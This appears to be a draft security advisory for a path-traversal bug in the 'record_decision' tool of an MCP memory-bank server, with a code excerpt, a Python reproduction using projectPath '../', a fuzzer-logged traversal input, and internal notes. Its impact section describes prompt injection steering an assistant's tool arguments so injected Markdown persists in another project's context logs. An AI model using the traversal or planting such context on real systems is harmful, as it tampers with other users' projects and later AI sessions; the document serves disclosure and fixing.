# Unrestricted `projectPath` in `record_decision`: appends to `memory-bank/decisionLog.md` in any directory

**Repository:** `dazeb/Cline-Memory-Bank` · **Tool:** `record_decision` · **Tested commit:** `55c81b9`
**Weakness:** CWE-22 Path Traversal

## Summary
`record_decision` appends a decision to `<projectPath>/memory-bank/decisionLog.md`. `projectPath` is used as given: relative paths resolve against the server's working directory, `..` segments are accepted, and nothing limits it to the project the server was set up for (`PROJECT_PATH`). Any existing `memory-bank/decisionLog.md` the user can write can be modified. The file name is fixed, so the reach is limited to files with that name.

## Details
`src/index.ts:706-719` at `55c81b9`:

```ts
  private async handleRecordDecision(args: any) {
    const { projectPath, decision } = args;
    if (!projectPath || !decision) { ... }
    try {
      const filePath = path.join(projectPath, this.memoryBankPath, 'decisionLog.md');
      const currentContent = await fs.readFile(filePath, 'utf8');
      const updatedContent = this.addDecision(currentContent, decision);
      await fs.writeFile(filePath, updatedContent, 'utf8');
```

`addDecision` (`src/index.ts:861-888`) inserts the caller's title, description, rationale and lists as Markdown after the first `## Technical Decisions` or `## Pending Decisions` heading. There is no `path.resolve` plus prefix check against `PROJECT_PATH` or any other root. The resource handler (`src/index.ts:302-316`) already reads from `process.env.PROJECT_PATH`, so a configured root exists but the tools do not use it.

## Steps to reproduce
1. Prerequisites: Node.js 16 or later. No accounts or keys. Create a working directory for the server and a marker log one level above it:
   ```
   mkdir -p /tmp/tofu-poc/root /tmp/tofu-poc/memory-bank
   printf 'marker\n\n## Technical Decisions\n' > /tmp/tofu-poc/memory-bank/decisionLog.md
   ```
2. Install the server:
   ```
   git clone https://github.com/dazeb/Cline-Memory-Bank.git
   cd Cline-Memory-Bank && git checkout 55c81b9cf6c16700983c84dc4cdea3cafa19a75f
   npm install && npm run build
   ```
3. Start it with working directory `/tmp/tofu-poc/root` and call the tool with a relative path that leaves that directory:
   ```json
   {"projectPath": "../", "decision": {"title": "tofu-poc", "description": "tofu-poc", "rationale": "tofu-poc", "status": "accepted"}}
   ```

   ```python
   import asyncio, os
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   SERVER = os.path.abspath("build/index.js")  # run from the Cline-Memory-Bank checkout

   async def main():
       server = StdioServerParameters(command="node", args=[SERVER], cwd="/tmp/tofu-poc/root")
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("record_decision", {
                   "projectPath": "../",
                   "decision": {"title": "tofu-poc", "description": "tofu-poc",
                                "rationale": "tofu-poc", "status": "accepted"}})
               print(result)

   asyncio.run(main())
   ```
4. What to observe: the result is `Decision recorded successfully`, and `/tmp/tofu-poc/memory-bank/decisionLog.md`, outside the server's working directory, now contains a `### tofu-poc (<today>)` entry after the `marker` line.

## Expected behavior
The tool should resolve `projectPath` and refuse it unless it is the configured project (`PROJECT_PATH`) or inside an allow-listed root.

## Actual behavior
The write goes to whatever directory the argument names. All logged calls returned success:

```
Decision recorded successfully
```

## Impact
In MCP the LLM chooses tool arguments, and prompt injection in content the model reads can steer them. An attacker can add arbitrary Markdown to the decision log of any other project on the machine that has a memory bank. Those logs are fed back to the assistant as context in later sessions, so injected text can persist across sessions. The file name is fixed and must already exist, so this cannot write arbitrary files. Severity is low.

## Suggested fix
Resolve `projectPath` with `path.resolve` and reject it unless it equals, or is inside, `process.env.PROJECT_PATH` (or a list of allowed roots). Better, drop the per-call `projectPath` and use the configured `PROJECT_PATH`, as the resource handler already does. Apply the same check in `update_context`, `track_progress` and `initialize_memory_bank`.

## Status on the default branch
Still present at `55c81b9` (2025-07-17). The tested commit is the head of the default branch.

## Prior reports
- #5 "Path Traversal Vulnerability in dazeb/cline-mcp-memory-bank" (issue, open 2026-04-27): same bug at the same commit `55c81b9`. It names `handleUpdateContext`, `handleRecordDecision` and `handleTrackProgress` and the unchecked `path.join(projectPath, this.memoryBankPath, ...)` before `readFile`/`writeFile`. Still open; the code is unchanged on the default branch.
- Documentation: README.md shows `projectPath: '/path/to/project'` as a free caller argument; it has no allowed-root setting and no warning about untrusted paths.

<details>
<summary>Internal notes (remove before filing)</summary>

- DUPLICATE/FIXED CHECK: duplicate of open issue #5 (2026-04-27), which names this handler at the same commit. Not fixed. Do not file separately.
- ToFu class / sanitizers: path-traversal via `check_path_traversal` (only sanitizer listed for this tool).
- Campaigns and executions: corpus-sbx 2,048 exec / 299 ok (60 s); e2-0922 1,024 exec / 155 ok (60 s).
- Evidence (verbatim, trimmed): `{'projectPath': '..\\..\\..\\..\\windows\\win.ini', 'decision': {'title': 'Path Traversal', 'description': 'Attempt to traverse directories', 'rationale': 'Check for path traversal vulnerability', 'status': 'proposed', 'impact': 'filesystem', 'alternatives': [], 'relatedDecisions': [], 'date': '2024-06-02'}}` -> `{'content': [{'type': 'text', 'text': 'Decision recorded successfully'}]}`. Two more inputs with the same `projectPath` gave the same output.
- Hand-check hints: weak. The logged `projectPath` is not a traversal on the Linux fuzzing hosts: `..\..\..\..\windows\win.ini` is one literal directory name under the server's cwd, and the call succeeded because an earlier fuzzed `initialize_memory_bank` call had created `memory-bank/decisionLog.md` inside that oddly named directory. The `../` reproduction is derived from the code, not from a logged run. The missing check against `PROJECT_PATH` is real, but the file name is fixed and the file must exist. Functional bugs seen in passing: `statusSection` (`src/index.ts:872`) is computed but unused, so "proposed" decisions go to whichever section comes first; and if neither heading is found, `addDecision` returns the file unchanged while the tool still reports success.
</details>
